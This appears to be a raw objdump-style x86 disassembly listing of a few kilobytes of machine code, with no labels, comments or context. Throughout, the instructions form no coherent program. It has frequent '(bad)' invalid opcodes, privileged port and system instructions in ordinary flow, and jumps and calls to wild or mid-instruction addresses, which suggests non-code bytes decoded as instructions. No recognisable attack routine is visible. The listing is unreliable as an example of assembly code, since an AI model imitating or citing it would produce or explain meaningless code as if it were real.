  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
